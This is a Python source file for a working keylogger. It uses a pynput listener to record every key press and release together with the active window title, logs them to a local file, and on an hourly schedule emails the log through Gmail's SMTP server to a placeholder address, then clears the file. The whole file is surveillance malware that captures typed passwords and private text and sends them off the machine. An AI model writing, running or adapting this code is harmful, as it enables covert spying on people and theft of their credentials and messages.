from logging import exception
import pygetwindow as gitwin
import smtplib
import queue
import pynput
import threading
import time
import schedule
from datetime import datetime
from email.message import EmailMessage

f_lock = threading.Lock()
send_overwrite = 0


class FileManipulator:
    #the appender w/ the queue
    @staticmethod
    def write_queue():
        with f_lock:
            f = open("demofile.txt", "a")

            global send_overwrite
            while send_overwrite != 1:
                time.sleep(0.2)
                #try block to handle empty block
                try:
                    #get the fifo logg
                    logg = PyLoggs.keyQueue.get_nowait()
                    f.write(f'{logg} ~ {datetime.now()}\n')
                except queue.Empty as e:
                    time.sleep(0.001)

            f.close()


    #crafting the email message to send
    @classmethod
    def make_message(cls, content):
        msg = EmailMessage()
        msg['Subject'] = f'logs ~ {datetime.now()}'
        msg['From'] = 'EMAIL HERE'
        msg['To'] = 'EMAIL HERE'
        msg.set_content(content)
        return msg


    @staticmethod
    def send_overwrite():
        with f_lock:
            #resetting var so writer can continue
            global send_overwrite
            send_overwrite = 0

            #getting session with google
            s = smtplib.SMTP('smtp.gmail.com', 587)
            #starting tls
            s.starttls()
            #dumping file to message string
            f = open("demofile.txt")
            message = FileManipulator.make_message(f.read())
            f.close()
            # Authentication
            s.login(message['From'], "YOUR PASSWORD")
            #send the mail
            s.sendmail(message["From"], message["To"], message.as_string())

            f = open("demofile.txt", "w")
            f.write("")
            f.close()



#the writer class to write to a file
class TheWriter:
    @staticmethod
    def write_to_file():
        FileManipulator.write_queue()
        ###while loop to reenter
        while True:
            time.sleep(0.5)
            FileManipulator.write_queue()



class PyLoggs:
    #keystroke queue
    keyQueue = queue.Queue(maxsize=-1)

    #class method to add key press to list
    @classmethod      #Key for spec keys or KeyCode for normal
    def on_press(cls, key, injected):
        try:
            key_press = '{} : {} : Window : {}'.format(
                key.char, 'faked' if injected else 'not faked', gitwin.getActiveWindowTitle())
            #adding item to end of list
            PyLoggs.keyQueue.put_nowait(key_press)
        except AttributeError:
            key_press = 'SK {} : Window : {}'.format(
                key, gitwin.getActiveWindowTitle())
            #adding item to end of list
            PyLoggs.keyQueue.put_nowait(key_press)


    @classmethod
    def on_release(cls, key, injected):
        #add release to queue
        key_release = '{} rels : {} : Window {}'.format(
            key, 'faked' if injected else 'not faked', gitwin.getActiveWindowTitle())
        #adding item to end of list
        PyLoggs.keyQueue.put_nowait(key_release)


    #main method for listen
    @classmethod
    def board_listen(cls):
        #listener start
        my_key_lstnr = pynput.keyboard.Listener(
            on_press=PyLoggs.on_press,
            on_release=PyLoggs.on_release)
        my_key_lstnr.start()

        #just looping inf never will exit.
        while True:
            time.sleep(60)



class timer:
    #this will call the method to overwrite and send
    #the queue dumper should see the lock exited as its waiting to reenter
    @staticmethod
    @schedule.repeat(schedule.every().hour.at(":00"))
    def send_overwrite():
        global send_overwrite
        send_overwrite = 1
        FileManipulator.send_overwrite()


    @classmethod
    def run_my_scedule(cls):
        #looping to check the time
        while True:
            schedule.run_pending()
            time.sleep(1)


##########################################


def main():
    f = open("demofile.txt", "w")
    f.close()

    #declaring and defining the logging thread
    t_loggs = threading.Thread(target=PyLoggs.board_listen, args=())
    #the writer thread 
    t_writer = threading.Thread(target=TheWriter.write_to_file, daemon=True, args=()).start()
    #the timer send/overwrite thread
    t_timer = threading.Thread(target=timer.run_my_scedule, daemon=True, args=()).start()
    #starting the main logging thread
    t_loggs.start()
    t_loggs.join()


if __name__ == "__main__":
    main()
